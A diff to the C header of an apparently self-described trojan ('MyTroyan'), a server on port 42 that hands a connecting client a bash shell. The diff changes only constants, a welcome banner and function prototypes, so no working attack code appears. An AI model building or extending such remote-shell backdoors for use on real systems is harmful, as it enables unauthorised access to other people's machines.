@@ -28,14 +28,19 @@
 /// Config
 #define PORT       42
 #define MAX_CLIENT 1
-#define STOP_CMD   "exit"
+#define LOGOUT_CMD "exit"
 #define SHELL_NAME "bash"
+#define EXIT_CMD   "stop"
+
+#define APP_WELCOME "{ MyTroyan - 04/2021 - Simon RACAUD }\nWelcome\n\n"
 
 /// Core
 int app(void);
 
 int app_process_request(server_t *server);
 int signal_init(void);
+int send_to_client(socket_t *client, size_t size, ...);
+void app_stop(void);
 
 /// SHELL
 int shell_client_init(socket_t *client, shell_t *shell);
@@ -43,7 +48,6 @@ void shell_stop(shell_t *shell);
 int send_shell_command(shell_t *shell, const char *command);
 
 /// USER
-bool is_logout_command(const char *command);
 void logout_user(server_t *server);
 
 #endif /* !APP_H_ */
